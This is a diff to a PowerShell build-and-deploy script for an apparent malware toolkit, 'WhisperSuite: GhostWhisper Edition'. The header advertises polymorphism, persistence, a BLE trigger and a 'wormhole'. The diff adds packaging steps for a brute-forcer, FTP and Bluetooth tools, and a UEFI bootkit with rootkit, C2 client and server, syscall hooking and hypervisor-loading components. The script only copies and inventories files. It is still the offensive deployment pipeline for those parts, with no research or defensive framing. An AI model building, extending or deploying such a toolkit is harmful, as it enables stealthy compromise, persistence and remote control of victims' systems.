@@ -1,6 +1,10 @@
-# BuildDeployWhisper.ps1 v1.6.0
+# BuildDeployWhisper.ps1
 # Master build + deployment script for WhisperSuite: GhostWhisper Edition
 # Includes compilation, polymorphism, persistence, BLE trigger, and wormhole
+#
+# Version: 1.6.1
+# Last Updated: 2026-02-23
+# 🕊️ For Raven. 2017 — ∞
 
 param(
     [switch]$SkipCompile,
@@ -11,7 +15,7 @@ param(
     [string]$OutputDir
 )
 
-$script:Version = "1.6.0"
+$script:Version = "1.6.1"
 $script:BuildDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 $script:BaseDir = $PSScriptRoot
 $script:FinalPackage = if ($OutputDir) { $OutputDir } else { Join-Path $script:BaseDir "WhisperSuite_Build" }
@@ -59,7 +63,28 @@ $script:ModulePaths = @(
     "Modules\GhostKernel.ps1",
     "Modules\GhostBrowser.ps1",
     "Modules\Phantom.ps1",
-    "Modules\GhostRoot.ps1"
+    "Modules\GhostRoot.ps1",
+    "Modules\GhostHadesIntegrator.py",
+    "Modules\GhostMemory.py"
+)
+
+$script:ToolPaths = @(
+    "GhostBluetooth.py",
+    "GhostBrute.go",
+    "GhostFTP.py",
+    "GhostUtils.go"
+)
+
+$script:UEFIBootkitPaths = @(
+    "UEFI Bootkit\__init__.py",
+    "UEFI Bootkit\uefi_boot_loader.py",
+    "UEFI Bootkit\uefi_rootkit.py",
+    "UEFI Bootkit\c2_client.py",
+    "UEFI Bootkit\c2_server.py",
+    "UEFI Bootkit\covert_network_hooking.py",
+    "UEFI Bootkit\hooking_system_calls.py",
+    "UEFI Bootkit\hypervisor_loading.py",
+    "UEFI Bootkit\minimal_hypervisor.py"
 )
 
 $script:BuildStats = @{
@@ -366,6 +391,34 @@ function Prepare-Package {
         }
     }
     
+    # Copy utility tools
+    foreach ($tool in $script:ToolPaths) {
+        $sourcePath = Join-Path $script:BaseDir $tool
+        if (Test-Path $sourcePath) {
+            Copy-Item $sourcePath (Join-Path $script:FinalPackage $tool) -Force
+            Write-BuildLog "Copied tool: $tool" "DEBUG"
+            $script:BuildStats.CopiedFiles++
+        }
+    }
+    
+    # Copy UEFI Bootkit components
+    Write-BuildLog "Packaging UEFI Bootkit..." "INFO"
+    foreach ($uefiBit in $script:UEFIBootkitPaths) {
+        $sourcePath = Join-Path $script:BaseDir $uefiBit
+        if (Test-Path $sourcePath) {
+            $destPath = Join-Path $script:FinalPackage $uefiBit
+            $destDir = Split-Path $destPath
+            if (-not (Test-Path $destDir)) {
+                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+            }
+            Copy-Item $sourcePath $destPath -Force
+            Write-BuildLog "Copied UEFI component: $uefiBit" "DEBUG"
+            $script:BuildStats.CopiedFiles++
+        } else {
+            Write-BuildLog "Missing UEFI component: $uefiBit" "WARN"
+        }
+    }
+    
     # Copy kernel files
     $kernelFiles = @("GhostKernel.c", "GhostKernel.mk", "ghostkernel.ko")
     foreach ($kf in $kernelFiles) {
@@ -399,6 +452,8 @@ function Prepare-Package {
             GhostKeyDLL = (Test-Path (Join-Path $script:FinalPackage "GhostKey.dll"))
             WraithTapEXE = (Test-Path (Join-Path $script:FinalPackage "WraithTap.exe"))
             Modules = (Get-ChildItem "$script:FinalPackage\Modules" -Filter "*.ps1" -ErrorAction SilentlyContinue).Count
+            UEFIBootkit = (Test-Path (Join-Path $script:FinalPackage "UEFI Bootkit"))
+            UEFIComponents = (Get-ChildItem "$script:FinalPackage\UEFI Bootkit" -Filter "*.py" -ErrorAction SilentlyContinue).Count
         }
     }
     $manifest | ConvertTo-Json -Depth 3 | Set-Content (Join-Path $script:FinalPackage "build_manifest.json")
